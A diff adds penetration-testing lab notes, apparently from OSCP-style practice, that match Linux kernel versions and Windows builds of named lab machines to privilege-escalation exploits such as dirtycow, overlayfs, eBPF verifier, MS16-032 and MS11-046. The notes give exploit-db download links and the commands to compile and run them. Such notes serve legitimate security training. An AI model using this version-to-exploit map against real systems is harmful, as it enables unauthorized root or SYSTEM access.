@@ -1,0 +1,178 @@
+# Notes
+Try compiling different ways (static vs dynamic, x86 vs x64)
+When running exploit, if you don't get a shell, check if a process was started.  Sometimes you wont get a callback to your terminal session
+
+
+
+# LINUX
+https://github.com/SecWiki/linux-kernel-exploits
+
+"Linux phoenix 2.6.9-89.EL #1 Mon Jun 22 12:19:40 EDT 2009 i686 athlon i386 GNO/Linux"
+https://www.exploit-db.com/exploits/9545		# need to change the socket option, not bluetooth
+$ find / -iname bluetooth.ko 2>/dev/null
+gcc -Wall -m32 -s -Wl,--hash-style=both -o 9545-dynamic 9545.c
+https://www.exploit-db.com/exploits/9542
+gcc -Wall -m32 -s -Wl,--hash-style=both -o 9542-dynamic 9542.c
+
+
+"Linux core 2.6.32-21-generic-pae #32-Ubuntu SMP Fri Apr 16 09:39:35 UTC 2010 i686 GNU/Linux"
+[+] [CVE-2010-3904] rds
+
+   https://www.exploit-db.com/exploits/15285
+   Details: http://www.securityfocus.com/archive/1/514379
+   Exposure: probable
+   Tags: debian=6.0{kernel:2.6.(31|32|34|35)-(1|trunk)-amd64},ubuntu=10.10|9.10,fedora=13{kernel:2.6.33.3-85.fc13.i686.PAE},[ ubuntu=10.04{kernel:2.6.32-(21|24)-generic} ]
+   Download URL: http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c
+
+Linux luigi 2.6.31-14-generic #48-Ubuntu SMP Fri Oct 16 14:04:26 UTC 2009 i686 GNU/Linux
+[+] [CVE-2016-5195] dirtycow 2
+
+   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+   Exposure: probable
+   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
+   Download URL: https://www.exploit-db.com/download/40839
+   ext-url: https://www.exploit-db.com/download/40847.cpp
+   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
+
+Linux humble 3.2.0-4-486 #1 Debian 3.2.78-1 i686 GNU/Linux
+[+] [CVE-2016-5195] dirtycow 2
+
+   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+   Exposure: probable
+   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
+   Download URL: https://www.exploit-db.com/download/40839
+   ext-url: https://www.exploit-db.com/download/40847
+   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
+
+# 192.168.X.87 Sumo   
+Linux ubuntu 3.2.0-23-generic #36-Ubuntu
+[+] [CVE-2016-5195] dirtycow 2
+
+   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+   Exposure: probable
+   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
+   Download URL: https://www.exploit-db.com/download/40839
+   ext-url: https://www.exploit-db.com/download/40847
+   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
+
+# 192.168.X.92 CyberSploit1   
+Linux cybersploit-CTF 3.13.0-32-generic
+[+] [CVE-2015-1328] overlayfs
+
+   Details: http://seclists.org/oss-sec/2015/q2/717
+   Exposure: probable
+   Tags: [ ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic} ],ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
+   Download URL: https://www.exploit-db.com/download/37292
+   
+Linux beta 3.0.0-12-generic #20-Ubuntu SMP Fri Oct 7 14:50:42 UTC 2011 i686 athlon i386 GNU/Linux
+https://exploit-db.com/exploits/35161
+# 10.11.1.72 BETA
+gcc 35161.c -o memodipper
+./memodipper
+
+# 10.11.1.116 DOTTY
+Linux dotty 4.4.0-116-generic #140-Ubuntu
+# compiled on kali
+Linux dotty 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+https://exploit-db.com/exploits/45010
+
+Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 athlon i386 GNU/Linux
+* https://www.exploit-db.com/exploits/37292
+* https://vk9-sec.com/overlayfs-local-privilege-escalation-cve-2015-1328/
+
+
+# 10.1.1.95 THELONGNIGHT.OSCP
+Linux thelongnight.oscp 4.4.0-31-generic #50-Ubuntu
+[+] [CVE-2017-16995] eBPF_verifier
+
+   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
+   Exposure: highly probable
+   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},ubuntu=(16.04|17.04){kernel:4.(8|10).0-(19|28|45)-generic}
+   Download URL: https://www.exploit-db.com/download/45010
+   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
+   
+# 192.168.X.50 BTRSys2.1
+Linux ubuntu 4.4.0-62-generic #83-Ubuntu
+[+] [CVE-2017-16995] eBPF_verifier
+
+   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
+   Exposure: highly probable
+   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},ubuntu=(16.04|17.04){kernel:4.(8|10).0-(19|28|45)-generic}
+   Download URL: https://www.exploit-db.com/download/45010
+   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
+   
+# 192.168.X.121 Loly
+[+] [CVE-2017-16995] eBPF_verifier
+
+   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
+   Exposure: highly probable
+   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},ubuntu=(16.04|17.04){kernel:4.(8|10).0-(19|28|45)-generic}
+   Download URL: https://www.exploit-db.com/download/45010
+   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
+   
+# 192.168.X.148 Stapler
+Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 athlon i686 GNU/Linux
+[+] [CVE-2016-4557] double-fdput()
+
+   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
+   Exposure: probable
+   Tags: [ ubuntu=16.04{kernel:4.4.0-(21|38|42|98|140)-generic} ]
+   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip
+   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
+
+
+
+# WINDOWS
+# run to get list of kernel exploits for target
+~/tools/Windows-Exploit-Suggester/windows-exploit-suggester.py -d ~/tools/Windows-Exploit-Suggester/2021-01-06-mssb.xls -i systeminfo.txt
+# collection of compiled windows exploits
+https://github.com/SecWiki/windows-kernel-exploits
+OS Name:                   Microsoft Windows VistaT Ultimate 
+OS Version:                6.0.6001 Service Pack 1 Build 6001
+https://www.exploit-db.com/exploits/40564
+
+Host Name:                 BETHANY
+OS Name:                   Microsoft Windows 8.1 Enterprise
+OS Version:                6.3.9600 N/A Build 9600
+https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032
+https://github.com/Meatballs1/ms16-032
+# NOTE, if running powershell exploit, make sure that the proper powershell version is running
+# C:\WINDOWS\sysnative\WindowsPowerShell\v1.0\powershell.exe
+PS C:\> [Environment]::Is64BitProcess
+True
+
+Host Name:                 CORY
+OS Name:                   Microsoft Windows 8.1 Pro
+OS Version:                6.3.9600 N/A Build 9600
+[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
+[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
+[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
+[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
+[*]
+
+# 10.1.1.248 BRETT
+Host Name:                 BRETT
+OS Name:                   Microsoft Windows 10 Pro
+OS Version:                10.0.17134 N/A Build 17134
+https://github.com/apt69/comahawk
+
+
+# 10.1.1.235 NINA
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion"
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion
+    CurrentVersion    REG_SZ    6.0
+    CurrentBuildNumber    REG_SZ    6001
+    CurrentBuild    REG_SZ    6001
+
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion"
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion
+    CurrentVersion    REG_SZ    6.0
+    CurrentBuildNumber    REG_SZ    6001
+    CurrentBuild    REG_SZ    6001
+
+https://www.exploit-db.com/exploits/40564
+
+i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32
+MS11-046.exe
